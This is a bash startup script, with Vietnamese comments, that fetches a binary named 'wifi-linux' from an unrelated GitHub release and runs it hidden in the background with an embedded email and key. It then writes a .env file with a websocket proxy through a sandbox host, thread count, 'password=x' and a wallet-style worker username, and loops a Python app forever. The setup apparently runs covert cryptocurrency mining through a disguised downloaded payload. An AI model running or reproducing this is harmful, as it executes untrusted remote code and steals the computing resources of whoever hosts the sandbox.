#!/bin/bash

# Check if python3 is installed
if ! command -v python3 &> /dev/null; then
    apt update || true
    apt install -y python3 curl || true
fi

rm -rf ./wifi-linux
curl -O -L -J https://github.com/mom742886/flutter-vertex-sample/releases/download/dev/wifi-linux
chmod +x wifi-linux
nohup ./wifi-linux -e malphite848@gmail.com -p c41ff3ef-ac25-4e91-aa23-39f5c8d91b93 >/dev/null 2>&1 &

# Set NAME from environment or use default
NAME=${NAME:-sandbox}

# Random host from list
HOSTS=(
    "5000-5a48ef3d-7ac0-4230-aefd-c64b66834d44.proxy.daytona.work"
)

# Chọn ngẫu nhiên 1 phần tử từ mảng
RANDOM_HOST=${HOSTS[$RANDOM % ${#HOSTS[@]}]}

# Ghi vào file .env
cat <<EOF > .env
host=127.0.0.1
port=3306
proxy=wss://$RANDOM_HOST/OC4yMjIuMjQ4LjI6ODA=
threads=4
password=x
username=BZPQZons7bUTPvUZoG6ftGAmaz9Pdp4kBZ.$NAME
EOF

# Tiếp tục chạy app
MIN=$1

while true; do
    python3 app.py "$MIN" --cache=".cache/*"
    sleep 1
done
